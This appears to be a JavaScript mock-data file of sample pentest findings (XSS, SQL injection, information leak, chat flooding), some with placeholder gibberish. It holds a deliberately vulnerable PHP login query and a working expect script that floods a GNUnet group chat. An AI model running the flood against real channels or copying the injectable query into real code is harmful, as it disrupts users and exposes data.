export const discussionsMock = [
  [
    {
      notes: [
        {
          body: 'Some source code from our website:\n\n```html\n\u003chead\u003e\n    \u003cmeta charset="utf-8"\u003e\n    \u003cmeta name="viewport" content="width=device-width initial-scale=1" /\u003e\n    \u003cmeta http-equiv="X-UA-Compatible" content="IE=edge"\u003e\n\n    \n\n    \u003ctitle\u003eNon-Profit Computer Security Consultancy\u003c/title\u003e\n    \u003cmeta name="description" content="We\'re an idealistic bunch of security researchers, networking/forensics geeks, and Capture The Flag winners that are passionate about making the world more secure."\u003e\n\n    \u003clink rel="shortcut icon" href="data:image/x-icon;," type="image/x-icon"\u003e\n\n    \u003clink rel="stylesheet" href="/assets/css/main.css"\u003e\n\n    \u003clink rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"\u003e\n    \u003clink rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png"\u003e\n    \u003clink rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"\u003e\n    \u003clink rel="manifest" href="/site.webmanifest"\u003e\n    \u003clink rel="mask-icon" href="/safari-pinned-tab.svg" color="#db6a26"\u003e\n    \u003cmeta name="msapplication-TileColor" content="#db6a26"\u003e\n    \u003cmeta name="theme-color" content="#db6a26"\u003e\n\n    \u003cmeta property="og:url" content="https://radicallyopensecurity.com"\u003e\n    \u003cmeta property="og:type" content="website"\u003e\n    \u003cmeta property="og:title" content="Non-Profit Computer Security Consultancy"\u003e\n    \u003cmeta property="og:description" content="We\'re an idealistic bunch of security researchers, networking/forensics geeks, and Capture The Flag winners that are passionate about making the world more secure."\u003e\n    \u003cmeta property="og:image" content="https://radicallyopensecurity.com/assets/images/ros-og-image.png"\u003e\n\n    \u003cmeta name="twitter:card" content="https://radicallyopensecurity.com/assets/images/ros-twitter-card.png"\u003e\n    \u003cmeta property="twitter:domain" content="radicallyopensecurity.com"\u003e\n    \u003cmeta property="twitter:url" content="https://radicallyopensecurity.com"\u003e\n    \u003cmeta name="twitter:title" content="Non-Profit Computer Security Consultancy"\u003e\n    \u003cmeta name="twitter:description" content="We\'re an idealistic bunch of security researchers, networking/forensics geeks, and Capture The Flag winners that are passionate about making the world more secure."\u003e\n    \u003cmeta name="twitter:image" content="https://radicallyopensecurity.com/assets/images/ros-twitter-summary.png"\u003e\n\n    \u003cmeta http-equiv="Content-Security-Policy" content="script-src \'self\'"\u003e\n\u003c/head\u003e\n```',
        },
      ],
    },
  ],
  [
    {
      notes: [
        {
          body: 'Type\n\nXSS',
        },
      ],
    },
    {
      notes: [
        {
          body: "Technical Description \n\nThe XSS vulnerability was discovered in the user input field of the application's login page. Our team was able to inject a script that could steal user login credentials and transmit them to a remote server controlled by the attacker. We were also able to inject other scripts that could execute arbitrary code on the user's browser and redirect them to a malicious website.\n\n![account_self_xss-2](/uploads/54c86d8ea813d8d0b2b317c435284d89/account_self_xss-2.png)",
        },
      ],
    },
    {
      notes: [
        {
          body: 'Impact\n\nIf left unaddressed, this XSS vulnerability could have severe consequences for the organization and its users. An attacker could steal sensitive user data such as login credentials, credit card information, and personal identifiable information. This could result in financial loss, reputational damage, and legal ramifications for the organization.',
        },
      ],
    },
    {
      notes: [
        {
          body: "Recommendation\n\nOur team recommends immediate remediation of this XSS vulnerability. This can be achieved by implementing proper input validation and sanitization techniques on the user input fields. We also recommend implementing a Content Security Policy (CSP) to prevent the execution of malicious scripts on the user's browser. Regular security assessments should be conducted to ensure the application's security posture is maintained over time.",
        },
      ],
    },
  ],
  [
    {
      notes: [
        {
          body: "The SQL injection attack on the database was identified through logs and network monitoring tools, which detected the use of malicious SQL commands in user input fields.\n\n`$username = $_POST['username'];`\n`$password = $_POST['password'];`\n\n// Connect to database\n`$conn = mysqli_connect('localhost', 'db_username', 'db_password', 'db_name');`\n\n// Create SQL query\n`$query = \"SELECT * FROM users WHERE username = '$username' AND password = '$password'\";`\n\n// Execute query\n`$result = mysqli_query($conn, $query);`\n\n// Check if user exists\n`if(mysqli_num_rows($result) \u003e 0){`\n    // User exists\n    // Login user\n`}else{`\n    // User does not exist\n    // Show error message\n`}`\n\n// Close connection\n`mysqli_close($conn);`\n\n\u003e In this example, the values of $username and $password are directly inserted into the SQL query without any validation or sanitization. This makes the code vulnerable to SQL injection attacks where the attacker can manipulate the input fields to inject malicious SQL code into the query, allowing them to gain unauthorized access to the database. To prevent this, the code should use parameterized queries or input validation mechanisms to ensure that only safe and expected values are passed to the database.\n\n![image](/uploads/e711692915783d425e07a4ade5a0d988/image.png)",
        },
      ],
    },
    {
      notes: [
        {
          body: "impact\n\nData Breaches: SQL injection attacks can allow attackers to access and extract sensitive data stored in the database. This can include customer information such as names, addresses, email addresses, and credit card details, as well as employee data such as social security numbers and payroll information.\n\nFinancial Losses: In addition to the costs associated with remediation and legal fees, companies may also face financial losses due to the theft of sensitive data. This can result in decreased revenue, loss of customers, and damage to the company's reputation.\n\nLegal Consequences: Depending on the nature of the data that was compromised, organizations may face legal consequences for failing to adequately protect sensitive information. This can result in fines, lawsuits, and other legal penalties.",
        },
      ],
    },
    {
      notes: [
        {
          body: 'recommendation\n\nUse Prepared Statements or Parameterized Queries: One of the most effective ways to prevent SQL injection attacks is to use prepared statements or parameterized queries instead of concatenating user input directly into SQL statements. Prepared statements allow you to separate the SQL code from the user input, ensuring that malicious code cannot be injected into the SQL statement. This approach can be used with a variety of programming languages and database systems.\n\nImplement Input Validation and Sanitization: Another way to prevent SQL injection attacks is to implement input validation and sanitization. This involves checking user input to ensure that it conforms to expected formats and types, as well as removing any potentially malicious characters or commands. This can be done using a variety of techniques, including regular expressions, input masks, and whitelist filtering.',
        },
      ],
    },
    {
      notes: [
        {
          body: 'type\n\nSQL injection vulnerability',
        },
      ],
    },
  ],
  [
    {
      notes: [
        {
          body: 'The attack was detected through abnormal network activity, which indicated that an unauthorized third party was intercepting and manipulating network traffic.',
        },
      ],
    },
  ],
  [
    {
      notes: [
        {
          body: 'Type\n\nInformation Leak',
        },
      ],
    },
    {
      notes: [
        {
          body: 'Technical Description\n\ndwqdwqddwq\n\u003eEW\ndwqdqdwq\ndwqdwqdwq',
        },
      ],
    },
    {
      notes: [
        {
          body: 'Impact\n\ndwqdwdwdwqdwqdwq',
        },
      ],
    },
    {
      notes: [
        {
          body: 'Recommendation\n\ndwdwqdwqdwq',
        },
      ],
    },
    {
      notes: [
        {
          body: 'Update\n\nThis finding was re-tested and is solved now!',
        },
      ],
    },
  ],
  [
    {
      notes: [
        {
          body: 'type\n\nflooding',
        },
      ],
    },
    {
      notes: [
        {
          body: 'impact\n\nWhere possible to enter a chat or group conversation, flooding it with content could make communication impossible as well as overwhelm the network with data.',
        },
      ],
    },
    {
      notes: [
        {
          body: 'recommendation\n\nWe recommend to ensure throttling or proof-of-work is in place for individual users to make sure individuals cannot flood the network with arbitrary data.',
        },
      ],
    },
    {
      notes: [
        {
          body: 'technical description\n\nWe managed to flood a group channel as a proof of concept using expect.\n\nRun the following expect script on a VPS with a connected GNUnet instance with gnunet-messenger to very easily flood a (group) chat channel.\n\n```expect\nexpect flooding.exp\n```\n\nflooding.exp\n\n```plaintext\n#!/usr/bin/expect -f\nset timeout -1\nspawn gnunet-messenger -d 4CA361EJ98F43FWT1S6KQZPYWSHNVFB2PKRZAGQFFZKXVXVGXXNG -r 4CA361EJ98F43FWT1S6KQZPYWSHNVFB2PKRZAGQFFZKXVXVGXXNG -e \'PENTEST\'\nmatch_max 100000\nexpect -exact "* You try to entry a room...\\r\\n* You joined the room.\\r\\n"\nsleep 0.5\nset i 1\nwhile {$i\u003c10000} {\n  send -- "$i:FLOOD_FLOOD_FLOOD_FLOOD_FLOOD_\\r"\n  sleep 0.01\n  expect -exact "$i:FLOOD_FLOOD_FLOOD_FLOOD_FLOOD_\\r"\n  incr i\n}\nsleep 0.5\nsend -- "^C"\nexpect eof\n```',
        },
      ],
    },
  ],
]
